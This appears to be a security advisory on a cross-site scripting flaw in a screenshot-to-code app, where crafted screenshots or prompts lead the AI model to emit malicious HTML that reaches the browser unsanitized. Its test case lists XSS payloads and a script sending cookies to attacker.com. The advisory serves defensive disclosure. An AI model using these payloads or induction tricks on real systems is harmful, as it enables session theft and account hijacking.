* Vulnerability Name: Cross-Site Scripting (XSS) in AI-Generated Code

* Description:
    1. An attacker uploads a screenshot or provides input via video or text prompt to the application.
    2. This input is sent to the backend and used to create a prompt for the AI model (GPT-4o, Claude Sonnet 3.7, etc.) in `backend\routes\generate_code.py` and `backend\prompts\__init__.py`. The system prompts in `backend\prompts\screenshot_system_prompts.py` instruct the AI to generate HTML and Javascript code.
    3. The prompt instructs the AI model to generate HTML and Javascript code that replicates the design in the screenshot or fulfills the text prompt. Mock responses in `backend\mock_llm.py` also demonstrate the generation of HTML code by the AI model.
    4. A malicious attacker crafts a screenshot or input prompt that is designed to trick the AI model into generating HTML or Javascript code containing malicious scripts. For example, the attacker can include elements in the screenshot that resemble input fields or buttons with text that could be interpreted as instructions to include Javascript code (e.g., a button labeled `<script>alert('XSS')</script>`).
    5. The backend, upon receiving the generated code from the AI model in `backend\routes\generate_code.py`, uses `extract_html_content` from `backend\codegen\utils.py` to extract the HTML content. This function, as confirmed by tests in `backend\codegen\test_utils.py`, only uses a regular expression to find content within `<html>` tags and does not perform any sanitization or encoding of the generated code.
    6. The backend then sends this extracted code to the frontend via a websocket message of type `setCode` in `backend\routes\generate_code.py`.
    7. If the frontend directly renders this received HTML code within the user's browser without proper sanitization, any malicious Javascript code generated by the AI will be executed. This leads to Cross-Site Scripting (XSS).

* Impact:
    Successful exploitation of this vulnerability allows an attacker to execute arbitrary Javascript code in the victim's browser. This can lead to various malicious activities, including:
    - Stealing user session cookies, allowing account hijacking.
    - Defacing the web page presented to the user.
    - Redirecting the user to malicious websites.
    - Performing actions on behalf of the user without their consent.
    - Harvesting sensitive information displayed on the page.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - None: The provided code does not include any explicit sanitization or encoding of the AI-generated HTML code before sending it to the frontend. The `extract_html_content` function in `backend\codegen\utils.py` only extracts HTML content and does not provide any security-related processing.

* Missing Mitigations:
    - Input Sanitization: Implement sanitization of the user-provided screenshot or input prompts to prevent injection of malicious instructions that could lead to malicious code generation by the AI.
    - Output Sanitization/Encoding: Before rendering the AI-generated HTML code in the frontend, it is crucial to sanitize or encode it to neutralize any potentially malicious Javascript code. This can be done using a library specifically designed for XSS prevention, which escapes or removes Javascript code and other potentially harmful HTML elements.
    - Content Security Policy (CSP): Implementing a Content Security Policy (CSP) can significantly reduce the impact of XSS attacks by controlling the sources from which the browser is allowed to load resources. This can help prevent the execution of inline scripts injected by an attacker.

* Preconditions:
    - The application must be running and accessible to the attacker.
    - The attacker needs to be able to upload a screenshot, provide a video, or text prompt input to the application.
    - The frontend application must be rendering the `setCode` websocket messages as HTML content in the browser without sanitization.

* Source Code Analysis:
    1. `backend\routes\generate_code.py`:
        - The `@router.websocket("/generate-code")` decorator defines the websocket endpoint that handles code generation requests.
        - `params: dict[str, str] = await websocket.receive_json()` receives the input from the frontend, including the screenshot (as a data URL in `params["image"]`) and other parameters.
        - `prompt_messages, image_cache = await create_prompt(params, stack, input_mode)` creates the prompt for the AI model based on the user input. The system prompts used are defined in `backend\prompts\screenshot_system_prompts.py` and explicitly instruct the AI to generate HTML and Javascript code.
        - `completions = await asyncio.gather(*tasks, return_exceptions=True)` calls the AI models (GPT-4o, Claude) to generate code based on the prompt.
        - `completions = [extract_html_content(completion) for completion in completions]` processes the generated code using `extract_html_content`.

    ```python
    # backend\codegen\utils.py
    import re

    def extract_html_content(text: str):
        # Use regex to find content within <html> tags and include the tags themselves
        match = re.search(r"(<html.*?>.*?</html>)", text, re.DOTALL)
        if match:
            return match.group(1)
        else:
            # Otherwise, we just send the previous HTML over
            print(
                "[HTML Extraction] No <html> tags found in the generated content: " + text
            )
            return text
    ```
        - As shown above and confirmed by tests in `backend\codegen\test_utils.py`, `extract_html_content` simply extracts the HTML tags using a regular expression without any sanitization.
        - `await send_message("setCode", updated_html, index)` sends the extracted HTML code to the frontend via the websocket. The `setCode` message type indicates that this content is intended to be rendered as code in the frontend.

    2. `backend\prompts\__init__.py` and `backend\prompts\screenshot_system_prompts.py`:
        - `assemble_prompt` and `assemble_imported_code_prompt` functions construct prompts for the AI models.
        - The system prompts in `backend\prompts\screenshot_system_prompts.py` (e.g., `HTML_TAILWIND_SYSTEM_PROMPT`, `HTML_CSS_SYSTEM_PROMPT`, etc.) explicitly instruct the AI to generate HTML and Javascript code based on the input image or text.  These prompts prioritize visual fidelity and functionality over security, lacking any instructions to sanitize or avoid generating potentially harmful code.
        - There is no logic in the prompt creation process to prevent the AI from generating malicious Javascript code if the input is crafted to induce such output.

    3. `backend\mock_llm.py`:
        - This file provides mock responses for the LLM, used for testing or development.  The mock responses, such as `APPLE_MOCK_CODE`, `NYTIMES_MOCK_CODE`, `NO_IMAGES_NYTIMES_MOCK_CODE`, `MORTGAGE_CALCULATOR_VIDEO_PROMPT_MOCK`, `GOOGLE_FORM_VIDEO_PROMPT_MOCK`, and `TALLY_FORM_VIDEO_PROMPT_MOCK`, are all HTML code snippets.
        - These mock responses confirm that the intended behavior of the application is to generate and handle HTML code, which, if not properly sanitized, can lead to XSS vulnerabilities as described.

* Security Test Case:
    1. Open the application in a web browser (e.g., `http://localhost:5173`).
    2. Prepare a screenshot that is designed to trigger malicious code generation. For example, create a simple image that looks like a button with the text `<img src=x onerror=alert('XSS')>` on it.  Alternatively, use a text prompt like  `<button onclick="alert('XSS')">Click me</button>`.
    3. In the application, use the "Screenshot to Code" functionality and upload the crafted screenshot or use the text prompt. Select any supported stack (e.g., HTML + Tailwind).
    4. Observe the generated code in the application's output. Check if the generated code contains the injected malicious Javascript (e.g., `<img src=x onerror=alert('XSS')>` or `<button onclick="alert('XSS')">Click me</button>`).
    5. If the frontend renders the generated code directly, the Javascript code `alert('XSS')` will be executed in the browser. A pop-up box with "XSS" will appear, demonstrating the Cross-Site Scripting vulnerability.
    6. To further verify, try injecting code that steals cookies or redirects to a malicious site. For example, use an image with alt text `<script>window.location.href='http://attacker.com/cookie-stealer?cookie='+document.cookie;</script>` or a text prompt that generates similar Javascript code.
    7. If successful, the user's browser will be redirected to `http://attacker.com/cookie-stealer` (or the attacker's chosen malicious action will be performed), confirming the XSS vulnerability and its potential impact.
